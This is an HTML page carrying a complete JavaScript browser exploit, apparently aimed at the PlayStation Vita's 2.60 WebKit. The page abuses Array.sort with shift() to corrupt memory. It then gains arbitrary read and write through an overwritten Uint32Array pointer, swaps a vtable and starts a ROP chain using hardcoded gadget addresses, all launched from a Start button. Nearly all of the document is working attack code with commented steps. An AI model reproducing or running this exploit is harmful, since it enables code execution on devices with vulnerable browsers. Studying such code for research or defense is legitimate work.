<html>
<body>
<script src="inc/utils.js"></script>
<script type="text/javascript">

// global vars
var _gc, _cnt = 0;

function tryExpl_vita(att)
{
	try {      
    //
    // Part 1: getting the Uint32Array object address
    //
	    // init vars  	    
	    var u32 = new Uint32Array(8);
	    var a1 = [0,1,2,3,u32];	       
	    var a2 = [0,1,2,3,4]; // right after a1
	    var a1len = a1.length;
	    var a2len = a2.length;	
	    var u32len = u32.length;  
	    	         	    
	    // protect local vars from GC	         	    
	    if (!_gc) _gc = new Array();
	    _gc.push(u32,a1,a2);
	    
	    // declare custom compare function    
	    var myCompFunc = function(x,y)
	    {  	    	
	    	// check for the last call for two last array items
	    	if (y == 3 && x == u32) {
	    		logAdd("myCompFunc(u32,3)");	    	
	    		// shift() is calling during sort(), what causes the 
	    		// last array item is written outside the array buffer
	    		a1.shift();
	    	}	    	    		
	    	return 0;
	    } 
	    
	    // call the vulnerable method - JSArray.sort(...)
	    a1.sort(myCompFunc);
	           
	    // check results: a2.length should be overwritten by a1[4]   
	    var u32addr = a2.length;
	    logAdd("a2.length = 0x" + u32addr.toString(16));
	    if (u32addr == a2len) { logAdd("error: 1"); return 1; }
	    
    //
    // Part 2: creating corrupted JSValue which points to the (u32+0x28) address
    //
	  	
	  	// modify our compare function
		myCompFunc = function(x,y)
		{
	    	if (y == 0 && x == 1) {
	    		logAdd("myCompFunc(1,0)");   	
	    		// 
	    		// call shift() again to read the corrupted JSValue from a2.length 
	    		// into a1[3] on the next sort loop
	    		a1.length = a1len;
	    		a1.shift();
	    		// modify JSValue 
	    		a2.length = u32addr + 0x28;
	    	}
	    	if (y == 3) {
	    		logAdd("myCompFunc(x,3)");
	    		// shift it back to access a1[3]
	    		a1.unshift(0);
	    	}       		
	    	return 0;
	    } 
	    
	    // start sorting
		a1.sort(myCompFunc);
		
		// now a1[3] should contain the corrupted JSValue from a2.length (=u32addr+0x28)
		var c = a2.length;
		logAdd("a2.length = 0x" + c.toString(16));
		if (c != u32addr + 0x28) { logAdd("error: 2"); a1[3] = 0; return 2; }
		
	//
	// Part 3: overwriting ((JSUint32Array)u32).m_impl pointer (see JSCTypedArrayStubs.h)
	//
								
		// prepare objects for the third sort() call
		var mo = {};
	    var pd = { get: function(){return 0;}, set: function(arg){return 0;}, enumerable:true, configurable:true }		
		var a3 = [0,1,2,a1[3]];
		
		// allocate mo's property storage right after a3's buffer
	    Object.defineProperty(mo, "prop0", pd);
	    for(var i=1; i < 7; i++){
	    	mo["prop"+i] = i;
	    }	
	    
	    // protect from GC
	    _gc.push(a3,mo,pd); 	
		
		// use sort-n-shift technique again
		myCompFunc = function(x,y)
		{  	
	    	// check for the last call for two last array items
	    	if (y == 2) {
	    		logAdd("myCompFunc(a3[3],2)"); 	
	    		// a3[3] will be written over the mo.prop0 object
	    		a3.shift();
	    	}	     		
	    	return 0;
	    } 
		
		// overwrite mo.prop0 by a3[3] = a1[3] = &u32+0x28
	    a3.sort(myCompFunc);
	    // clear corrupted JSValue
	    a1[3] = 0; a3[3] = 0; 
	    
	    // construct the valid GetterSetter object
	    u32.prop1 = 8; 	// 8 = JSType.GetterSetterType
	    u32.prop2 = 8; 
	    u32.prop3 = 8;	    
	    u32.prop4 = u2d(u32addr, u32addr+0x10); // ((GetterSetter)mo.prop0).m_structure
	      
	    // prepare JSFunction which will be refered by u32.m_impl  
	    var f = new Function(" return 876543210 + " + (_cnt++) + ";");
  		f.prop2 = u2d(0x40000000,0x40000000); // a new value for u32.length
	    f();
	    
	    // overwrite u32.m_impl by the pd.get object
	    pd.get = f;
	    Object.defineProperty(mo, "prop0", pd);	
		
		// delete corrupted property
		delete mo.prop0;
		
		// check results: u32.length is taken from f's internals
		logAdd("u32.length = 0x" + u32.length.toString(16));
		if (u32.length == u32len) { logAdd("error: 3"); return 3; }
		//logAdd("u32[] data:<br/>" + ArrayToString(u32,0,16)); // for RnD
		
	//
	//  Part 4: copying vtable
	//
			
		// find out the memory address of u32[0] (ArrayBufferView.m_baseAddress)
		var u32base = u32[0x40000000-2];
		logAdd("u32 address = 0x" + u32addr.toString(16));
		logAdd("u32 base = 0x" + u32base.toString(16));
			
		// declare aux functions 				
		var getU32 = function(addr) { 
			return u32[(addr - u32base) >>> 2]; 	
		}
		var setU32 = function(addr,val) { 
			return u32[(addr - u32base) >>> 2] = val; 	
		}

		var vtable = getU32(u32addr);
		
		// copy vtable to writable memory (u32base)
		for (var i = 0; i < 50; i++)
		{
			u32[i] = getU32(vtable+(i*4));
		}
		
		u32[0] = u32base+0xA0;
		
		// 2.60 SPECIFIC GADGETS
		u32[0x48/4] = 0x81A8A3C1;
		u32[0xA8/4] = 0x81AE84D5;
		u32[(0xA0+0xA4)/4] = 0x81EABC02|1;
		
		// BEGIN STACK
		u32[3] = 0xB16B00B5; // this is new PC
		
		// write new vtable
		u32[0x40000000-2] = u32addr >>> 0;
		u32[0] = u32base;
		
		// BEGIN ROP AND ROLL
		u32.toString(0xDEADBEEF, 0xDEADBEEF, 0xDEADBEEF);
	}
	catch(e) {
	    logAdd("Error: " + e);
	}
	
	return 0;
}

// "Start" button onclick handler
function btnClick()
{
	try {   
	    logAdd("======== Start ========");
		
		tryExpl_vita(1);
		
		logAdd("<br/>========&nbsp;End &nbsp;========<br/><br/>");	
	}
	catch(e) {
	    logAdd(e);
	}
	_log = null;
}

// print environment info
writeEnvInfo();

</script>

<button style="width:100px;" onclick="btnClick();">Start</button>
<br/><br/>
<div id="log"></div>
</body>
</html>